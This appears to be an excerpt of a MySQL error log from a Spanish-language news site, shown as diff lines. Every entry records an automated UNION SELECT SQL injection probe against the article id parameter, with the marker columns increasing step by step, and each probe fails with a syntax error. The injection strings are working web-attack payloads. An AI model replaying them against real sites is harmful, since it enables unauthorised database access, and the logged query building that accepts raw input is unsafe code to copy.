+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45),CHAR(45,120,49,57,45,81,45),CHAR(45,120,50,48,45,81,45),CHAR(45,120,50,49,45,81,45) -- /* order by 'as /*
+
+Time : 21:22:26
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45),CHAR(45,120,49,57,45,81,45),CHAR(45,120,50,48,45,81,45) -- /* order by 'as /*
+
+Time : 21:22:25
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45),CHAR(45,120,49,57,45,81,45) -- /* order by 'as /*
+
+Time : 21:22:25
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45) -- /* order by 'as /*
+
+Time : 21:22:25
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45) -- /* order by 'as /*
+
+Time : 21:22:24
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45) -- /* order by 'as /*
+
+Time : 21:22:24
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45) -- /* order by 'as /*
+
+Time : 21:22:24
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45) -- /* order by 'as /*
+
+Time : 21:22:23
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45) -- /* order by 'as /*
+
+Time : 21:22:23
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45) -- /* order by 'as /*
+
+Time : 21:22:22
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45) -- /* order by 'as /*
+
+Time : 21:22:22
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45) -- /* order by 'as /*
+
+Time : 21:22:22
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45) -- /* order by 'as /*
+
+Time : 21:22:21
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45) -- /* order by 'as /*
+
+Time : 21:22:21
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45) -- /* order by 'as /*
+
+Time : 21:22:21
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45) -- /* order by 'as /*
+
+Time : 21:22:20
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45) -- /* order by 'as /*
+
+Time : 21:22:20
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45) -- /* order by 'as /*
+
+Time : 21:22:19
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45) -- /* order by 'as /*
+
+Time : 21:22:19
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45) -- /* order by ' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45) -- /* order by 'as /*
+
+Time : 21:22:19
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION SELECT CHAR(45,120,49,45,81,45) -- /* order by 'as /*' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111' UNION SELECT CHAR(45,120,49,45,81,45) -- /* order by 'as /*
+
+Time : 21:22:18
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111 UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45),CHAR(45,120,49,57,45,81,45),CHAR(45,120,50,48,45,81,45),CHAR(45,120,50,49,45,81,45),CHAR(45,120,50,50,45,81,45),CHAR(45,120,50,51,45,81,45),CHAR(45,120,50,52,45,81,45),CHAR(45,120,50,53,45,81,45) --  /*
+
+Time : 21:22:18
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111 UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45),CHAR(45,120,49,57,45,81,45),CHAR(45,120,50,48,45,81,45),CHAR(45,120,50,49,45,81,45),CHAR(45,120,50,50,45,81,45),CHAR(45,120,50,51,45,81,45),CHAR(45,120,50,52,45,81,45) --  /*
+
+Time : 21:22:18
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111 UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45),CHAR(45,120,49,57,45,81,45),CHAR(45,120,50,48,45,81,45),CHAR(45,120,50,49,45,81,45),CHAR(45,120,50,50,45,81,45),CHAR(45,120,50,51,45,81,45) --  /*
+
+Time : 21:22:17
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111 UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45),CHAR(45,120,49,57,45,81,45),CHAR(45,120,50,48,45,81,45),CHAR(45,120,50,49,45,81,45),CHAR(45,120,50,50,45,81,45) --  /*
+
+Time : 21:22:17
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111 UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45),CHAR(45,120,49,57,45,81,45),CHAR(45,120,50,48,45,81,45),CHAR(45,120,50,49,45,81,45) --  /*
+
+Time : 21:22:16
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111 UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45),CHAR(45,120,49,57,45,81,45),CHAR(45,120,50,48,45,81,45) --  /*
+
+Time : 21:22:16
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111 UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45),CHAR(45,120,49,57,45,81,45) --  /*
+
+Time : 21:22:16
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111 UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45) --  /*
+
+Time : 21:22:15
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111 UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45) --  /*
+
+Time : 21:22:15
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111 UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45) --  /*
+
+Time : 21:22:15
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111 UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45) --  /*
+
+Time : 21:22:14
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111 UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45) --  /*
+
+Time : 21:22:14
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45' at line 1
